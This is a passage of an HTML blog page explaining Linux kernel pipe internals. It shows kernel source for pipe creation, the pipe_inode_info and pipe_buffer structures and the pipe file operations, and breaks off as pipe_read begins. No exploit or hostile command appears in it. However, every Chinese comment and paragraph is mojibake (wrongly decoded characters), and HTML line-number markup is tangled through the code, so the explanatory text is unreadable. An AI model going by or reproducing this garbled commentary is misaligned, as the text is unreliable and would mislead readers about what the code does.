class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">create_pipe_files</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file **res, <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> get_pipe_inode();<span class="hljs-comment">//è·å–ä¸€ä¸ªç”¨äºç®¡é“çš„ inode å¯¹è±¡</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">f</span>;</span><br><br><span class="hljs-keyword">if</span> (!inode)<br><span class="hljs-keyword">return</span> -ENFILE;<br><br><span class="hljs-keyword">if</span> (flags &amp; O_NOTIFICATION_PIPE) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-keyword">if</span> (watch_queue_init(inode-&gt;i_pipe) &lt; <span class="hljs-number">0</span>) &#123;<br>iput(inode);<br><span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">return</span> -ENOPKG;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br><span class="hljs-comment">//å‡½æ•°åˆ›å»ºä¸€ä¸ªä¼ªæ–‡ä»¶å¯¹è±¡ï¼Œè¯¥æ–‡ä»¶å¯¹è±¡è¿æ¥åˆ°ä¹‹å‰è·å–çš„ç®¡é“ inode ä¸Šã€‚å®ƒå°†æ ¹æ®ä¼ å…¥çš„æ ‡å¿—è®¾ç½®æ–‡ä»¶çš„è¯»å†™å±æ€§ï¼Œå¹¶å°†å…¶ä¸ç®¡é“çš„æ“ä½œå‡½æ•° pipefifo_fops å…³è”èµ·æ¥ã€‚å¦‚æœåˆ›å»ºå¤±è´¥ï¼Œä¼šé‡Šæ”¾ä¹‹å‰åˆ†é…çš„ç®¡é“ä¿¡æ¯å¹¶é‡Šæ”¾ inodeï¼Œç„¶åè¿”å›ç›¸åº”çš„é”™è¯¯ä»£ç ã€‚</span><br>f = alloc_file_pseudo(inode, pipe_mnt, <span class="hljs-string">&quot;&quot;</span>,<br>O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),<br>&amp;pipefifo_fops);<br><span class="hljs-keyword">if</span> (IS_ERR(f)) &#123;<br>free_pipe_info(inode-&gt;i_pipe);<br>iput(inode);<br><span class="hljs-keyword">return</span> PTR_ERR(f);<br>&#125;<br><span class="hljs-comment">//å¯¹åˆ›å»ºçš„å†™å…¥ç«¯æ–‡ä»¶å¯¹è±¡è®¾ç½®ç§æœ‰æ•°æ®æŒ‡é’ˆæŒ‡å‘ç®¡é“çš„ inodeã€‚</span><br>f-&gt;private_data = inode-&gt;i_pipe;<br><span class="hljs-comment">//è°ƒç”¨ alloc_file_clone å‡½æ•°åˆ›å»ºä¸€ä¸ªå…‹éš†çš„æ–‡ä»¶å¯¹è±¡ä½œä¸ºè¯»å–ç«¯ï¼ŒåŒæ—¶å°†å…¶ä¸ç®¡é“çš„æ“ä½œå‡½æ•° pipefifo_fops å…³è”èµ·æ¥ã€‚å¦‚æœåˆ›å»ºå¤±è´¥ï¼Œä¼šé‡Šæ”¾ä¹‹å‰åˆ†é…çš„ç®¡é“ä¿¡æ¯ã€é‡Šæ”¾å†™å…¥ç«¯æ–‡ä»¶å¯¹è±¡å¹¶è¿”å›ç›¸åº”çš„é”™è¯¯ä»£ç ã€‚</span><br>res[<span class="hljs-number">0</span>] = alloc_file_clone(f, O_RDONLY | (flags &amp; O_NONBLOCK),<br>  &amp;pipefifo_fops);<br><span class="hljs-keyword">if</span> (IS_ERR(res[<span class="hljs-number">0</span>])) &#123;<br>put_pipe_info(inode, inode-&gt;i_pipe);<br>fput(f);<br><span class="hljs-keyword">return</span> PTR_ERR(res[<span class="hljs-number">0</span>]);<br>&#125;<br>res[<span class="hljs-number">0</span>]-&gt;private_data = inode-&gt;i_pipe;<br>res[<span class="hljs-number">1</span>] = f;<br>stream_open(inode, res[<span class="hljs-number">0</span>]);<br>stream_open(inode, res[<span class="hljs-number">1</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="get-pipe-inode"><a href="#get-pipe-inode" class="headerlink" title="get_pipe_inode"></a>get_pipe_inode</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> inode * <span class="hljs-title function_">get_pipe_inode</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> new_inode_pseudo(pipe_mnt-&gt;mnt_sb);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br><br><span class="hljs-keyword">if</span> (!inode)<br><span class="hljs-keyword">goto</span> fail_inode;<br><br>inode-&gt;i_ino = get_next_ino();<br><span class="hljs-comment">//åˆ†é…ä¸€ä¸ªæ–°çš„ç®¡é“ä¿¡æ¯ç»“æ„ä½“ pipe_inode_infoï¼Œç”¨äºå­˜å‚¨ç®¡é“çš„çŠ¶æ€ä¿¡æ¯</span><br>pipe = alloc_pipe_info();<br><span class="hljs-keyword">if</span> (!pipe)<br><span class="hljs-keyword">goto</span> fail_iput;<br><br>inode-&gt;i_pipe = pipe;<br>pipe-&gt;files = <span class="hljs-number">2</span>;<br>pipe-&gt;readers = pipe-&gt;writers = <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//å°†ç®¡é“çš„æ“ä½œå‡½æ•° pipefifo_fops èµ‹å€¼ç»™ inode çš„æ–‡ä»¶æ“ä½œç¬¦ i_fop</span><br>inode-&gt;i_fop = &amp;pipefifo_fops;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Mark the inode dirty from the very beginning,</span><br><span class="hljs-comment"> * that way it will never be moved to the dirty</span><br><span class="hljs-comment"> * list because &quot;mark_inode_dirty()&quot; will think</span><br><span class="hljs-comment"> * that it already _is_ on the dirty list.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//è®¾ç½® inode çš„çŠ¶æ€ä¸º I_DIRTYï¼Œè¡¨ç¤ºè¯¥ inode æ˜¯è„çš„ï¼Œéœ€è¦åŒæ­¥åˆ°ç£ç›˜ä¸Šã€‚</span><br>inode-&gt;i_state = I_DIRTY;<br>inode-&gt;i_mode = S_IFIFO | S_IRUSR | S_IWUSR;<br>inode-&gt;i_uid = current_fsuid();<br>inode-&gt;i_gid = current_fsgid();<br>inode-&gt;i_atime = inode-&gt;i_mtime = inode-&gt;i_ctime = current_time(inode);<br><br><span class="hljs-keyword">return</span> inode;<br><br>fail_iput:<br>iput(inode);<br><br>fail_inode:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="alloc-pipe-info"><a href="#alloc-pipe-info" class="headerlink" title="alloc_pipe_info"></a>alloc_pipe_info</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br>    <span class="hljs-comment">//é»˜è®¤æ•°é‡ä¸º PIPE_DEF_BUFFERS ï¼ˆ16ï¼‰ä¸ªï¼Œå³ä¸€ä¸ªç®¡é“åˆå§‹é»˜è®¤å¯ä»¥å­˜æ”¾ 16 å¼ é¡µé¢çš„æ•°æ®</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;<br>    <span class="hljs-comment">//user æ˜¯æŒ‡å‘å½“å‰ç”¨æˆ·ä¿¡æ¯ç»“æ„ä½“çš„æŒ‡é’ˆï¼Œé€šè¿‡ get_current_user() å‡½æ•°è·å–</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span> =</span> get_current_user();<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_bufs;<span class="hljs-comment">//è®¡ç®—å‡ºå½“å‰ç”¨æˆ·å¯ç”¨çš„ç®¡é“ç¼“å†²åŒºæ•°é‡ user_bufs</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_size = READ_ONCE(pipe_max_size);<span class="hljs-comment">//ä» pipe_max_size ä¸­è¯»å–ç®¡é“çš„æœ€å¤§size</span><br><span class="hljs-comment">//è°ƒç”¨ kzalloc() åˆ†é…å¤§å°ä¸º sizeof(struct pipe_inode_info) çš„å†…å­˜ç©ºé—´ç”¨äºç®¡é“ä¿¡æ¯ç»“æ„ä½“ã€‚å¦‚æœåˆ†é…å¤±è´¥ï¼Œå°†è·³è½¬åˆ° out_free_uid æ ‡ç­¾å¤„é‡Šæ”¾ç”¨æˆ·ç»“æ„ä½“å¹¶è¿”å› NULLã€‚</span><br>pipe = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);<br><span class="hljs-keyword">if</span> (pipe == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">goto</span> out_free_uid;<br><span class="hljs-comment">//å¦‚æœç®¡é“ç¼“å†²åŒºæ•°é‡ä¹˜ä»¥é¡µå¤§å°å¤§äºæœ€å¤§å°ºå¯¸ï¼Œå¹¶ä¸”å½“å‰è¿›ç¨‹ä¸å…·å¤‡ CAP_SYS_RESOURCE èƒ½åŠ›ï¼Œåˆ™å°†ç®¡é“ç¼“å†²åŒºæ•°é‡è°ƒæ•´ä¸ºæœ€å¤§å°ºå¯¸é™¤ä»¥é¡µå¤§å°ã€‚</span><br><span class="hljs-keyword">if</span> (pipe_bufs * PAGE_SIZE &gt; max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))<br>pipe_bufs = max_size &gt;&gt; PAGE_SHIFT;<br><span class="hljs-comment">//è°ƒç”¨ account_pipe_buffers() å‡½æ•°æ¥è®¡ç®—å½“å‰ç”¨æˆ·å¯ç”¨çš„ç®¡é“ç¼“å†²åŒºæ•°é‡ user_bufs</span><br>user_bufs = account_pipe_buffers(user, <span class="hljs-number">0</span>, pipe_bufs);<br><span class="hljs-comment">//å¦‚æœå½“å‰ç”¨æˆ·çš„ç®¡é“ç¼“å†²åŒºæ•°é‡è¶…è¿‡è½¯é™åˆ¶å¹¶ä¸”ç®¡é“æ˜¯ç”±éç‰¹æƒç”¨æˆ·åˆ›å»ºçš„ï¼Œåˆ™å°è¯•é™ä½ç®¡é“ç¼“å†²åŒºæ•°é‡åˆ°è½¯é™åˆ¶ä»¥ä¸‹ï¼Œå¹¶å°†ç®¡é“ç¼“å†²åŒºæ•°é‡è®¾ç½®ä¸º1ã€‚</span><br><span class="hljs-keyword">if</span> (too_many_pipe_buffers_soft(user_bufs) &amp;&amp; pipe_is_unprivileged_user()) &#123;<br>user_bufs = account_pipe_buffers(user, pipe_bufs, <span class="hljs-number">1</span>);<br>pipe_bufs = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">//å¦‚æœå½“å‰ç”¨æˆ·çš„ç®¡é“ç¼“å†²åŒºæ•°é‡è¶…è¿‡ç¡¬é™åˆ¶å¹¶ä¸”ç®¡é“æ˜¯ç”±éç‰¹æƒç”¨æˆ·åˆ›å»ºçš„ï¼Œåˆ™æ”¾å¼ƒåˆ›å»ºç®¡é“ï¼Œå¹¶è·³è½¬åˆ° out_revert_acct æ ‡ç­¾å¤„è¿›è¡Œæ¸…ç†ã€‚</span><br><span class="hljs-keyword">if</span> (too_many_pipe_buffers_hard(user_bufs) &amp;&amp; pipe_is_unprivileged_user())<br><span class="hljs-keyword">goto</span> out_revert_acct;<br><span class="hljs-comment">//åˆ†é…å¤§å°ä¸º pipe_bufs ä¸ª struct pipe_buffer çš„å†…å­˜ç©ºé—´ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™ pipe-&gt;bufsï¼Œè¡¨ç¤ºç®¡é“çš„ç¼“å†²åŒº</span><br>pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer),<br>     GFP_KERNEL_ACCOUNT);<br><br><span class="hljs-keyword">if</span> (pipe-&gt;bufs) &#123;<br>init_waitqueue_head(&amp;pipe-&gt;rd_wait);<br>init_waitqueue_head(&amp;pipe-&gt;wr_wait);<br>pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="hljs-number">1</span>;<br>pipe-&gt;max_usage = pipe_bufs;<br>pipe-&gt;ring_size = pipe_bufs;<br>pipe-&gt;nr_accounted = pipe_bufs;<br>pipe-&gt;user = user;<br>mutex_init(&amp;pipe-&gt;mutex);<br><span class="hljs-keyword">return</span> pipe;<br>&#125;<br><br>out_revert_acct:<br>(<span class="hljs-type">void</span>) account_pipe_buffers(user, pipe_bufs, <span class="hljs-number">0</span>);<br>kfree(pipe);<br>out_free_uid:<br>free_uid(user);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h3><p>ç®¡é“çš„å®è´¨æ˜¯ç”±ä¸€ä¸ª <code>pipe_inode_info</code> ç»“æ„ä½“æ¥ç®¡ç†çš„ï¼Œå…¶pipe_bufferç±»ä¼¼äºå¾ªç¯é˜Ÿåˆ—ã€‚åœ¨è¿™ä¸ªå¾ªç¯é˜Ÿåˆ—ä¸­ï¼Œç®¡é“çš„å†™å…¥æ“ä½œæ˜¯å‘é˜Ÿåˆ—å¤´éƒ¨æ·»åŠ æ•°æ®ï¼ˆå³å¾€é˜Ÿåˆ—å°¾éƒ¨ç§»åŠ¨ï¼‰ï¼Œè€Œè¯»å–æ“ä½œåˆ™æ˜¯ä»é˜Ÿåˆ—å°¾éƒ¨è·å–æ•°æ®ï¼ˆå³ä»é˜Ÿåˆ—å¤´éƒ¨ç§»åŠ¨ï¼‰ã€‚åœ¨ç®¡é“çš„ <code>pipe_inode_info</code> ç»“æ„ä½“ä¸­ï¼Œ<code>head</code> æˆå‘˜è¡¨ç¤ºé˜Ÿåˆ—å¤´çš„ç´¢å¼•ï¼Œ<code>tail</code> æˆå‘˜è¡¨ç¤ºé˜Ÿåˆ—å°¾çš„ç´¢å¼•ï¼Œå¤´è¿›å°¾å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_inode_info - a linux kernel pipe</span><br><span class="hljs-comment"> *@mutex: mutex protecting the whole thing</span><br><span class="hljs-comment"> *@rd_wait: reader wait point in case of empty pipe</span><br><span class="hljs-comment"> *@wr_wait: writer wait point in case of full pipe</span><br><span class="hljs-comment"> *@head: The point of buffer production</span><br><span class="hljs-comment"> *@tail: The point of buffer consumption</span><br><span class="hljs-comment"> *@note_loss: The next read() should insert a data-lost message</span><br><span class="hljs-comment"> *@max_usage: The maximum number of slots that may be used in the ring</span><br><span class="hljs-comment"> *@ring_size: total number of buffers (should be a power of 2)</span><br><span class="hljs-comment"> *@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span><br><span class="hljs-comment"> *@tmp_page: cached released page</span><br><span class="hljs-comment"> *@readers: number of current readers of this pipe</span><br><span class="hljs-comment"> *@writers: number of current writers of this pipe</span><br><span class="hljs-comment"> *@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span><br><span class="hljs-comment"> *@r_counter: reader counter</span><br><span class="hljs-comment"> *@w_counter: writer counter</span><br><span class="hljs-comment"> *@fasync_readers: reader side fasync</span><br><span class="hljs-comment"> *@fasync_writers: writer side fasync</span><br><span class="hljs-comment"> *@bufs: the circular array of pipe buffers</span><br><span class="hljs-comment"> *@user: the user who created this pipe</span><br><span class="hljs-comment"> *@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">mutex</span>;</span><br><span class="hljs-type">wait_queue_head_t</span> rd_wait, wr_wait;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_usage;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ring_size;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-type">bool</span> note_loss;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_accounted;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> readers;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> writers;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> files;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r_counter;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> w_counter;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_readers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_writers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_queue</span> *<span class="hljs-title">watch_queue</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *@len: length of data inside the @page</span><br><span class="hljs-comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br></code></pre></td></tr></table></figure><p><code>pipe</code>çš„å¤§ä½“ç»“æ„å›¾å¦‚ä¸‹æ‰€ç¤ºï¼ˆå›¾æ¥è‡ªA3ğŸ‘´çš„blogï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240318220949.png"></p><h2 id="pipeã®å‡½æ•°è¡¨"><a href="#pipeã®å‡½æ•°è¡¨" class="headerlink" title="pipeã®å‡½æ•°è¡¨"></a>pipeã®å‡½æ•°è¡¨</h2><p>ç»è¿‡å¦‚ä¸‹è°ƒç”¨é“¾</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SCSS">do_pipe2<br>__do_pipe_flags<br>create_pipe_files<br>alloc_file_pseudo<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//å‡½æ•°åˆ›å»ºä¸€ä¸ªä¼ªæ–‡ä»¶å¯¹è±¡ï¼Œè¯¥æ–‡ä»¶å¯¹è±¡è¿æ¥åˆ°ä¹‹å‰è·å–çš„ç®¡é“ inode ä¸Šã€‚å®ƒå°†æ ¹æ®ä¼ å…¥çš„æ ‡å¿—è®¾ç½®æ–‡ä»¶çš„è¯»å†™å±æ€§ï¼Œå¹¶å°†å…¶ä¸ç®¡é“çš„æ“ä½œå‡½æ•° pipefifo_fops å…³è”èµ·æ¥ã€‚å¦‚æœåˆ›å»ºå¤±è´¥ï¼Œä¼šé‡Šæ”¾ä¹‹å‰åˆ†é…çš„ç®¡é“ä¿¡æ¯å¹¶é‡Šæ”¾ inodeï¼Œç„¶åè¿”å›ç›¸åº”çš„é”™è¯¯ä»£ç ã€‚</span><br>f = alloc_file_pseudo(inode, pipe_mnt, <span class="hljs-string">&quot;&quot;</span>,<br>O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),<br>&amp;pipefifo_fops);<br></code></pre></td></tr></table></figure><p><strong>pipefifo_ops</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">pipefifo_fops</span> =</span> &#123;<br>.open= fifo_open,<br>.llseek= no_llseek,<br>.read_iter= pipe_read,<br>.write_iter= pipe_write,<br>.poll= pipe_poll,<br>.unlocked_ioctl= pipe_ioctl,<br>.release= pipe_release,<br>.fasync= pipe_fasync,<br>&#125;;<br></code></pre></td></tr></table></figure><p>é‡ç‚¹å…³æ³¨è¯»å†™æ“ä½œ</p><h3 id="pipe-read"><a href="#pipe-read" class="headerlink" title="pipe_read"></a>pipe_read</h3><p>ä»<code>pipe</code>ä¸­è¯»å–æ•°æ®ï¼Œä¼šè°ƒç”¨åˆ°<code>pipe_read</code></p><p>ä¸€ä¸ªæ¥ä¸€ä¸ªçš„è¯»å–bufferä¸­çš„æ•°æ®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span 